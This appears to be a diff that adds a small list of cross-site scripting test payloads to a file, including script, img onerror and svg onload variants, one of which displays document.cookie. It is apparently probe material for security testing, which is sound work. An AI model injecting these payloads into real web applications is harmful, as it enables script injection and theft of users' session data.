@@ -1,0 +1,5 @@
+<script>alert(1)</script>
+<img src=x onerror=alert(1)>
+<svg onload=alert(1)>
+<script>alert(window.origin)</script>
+<script>alert(document.cookie)</script>
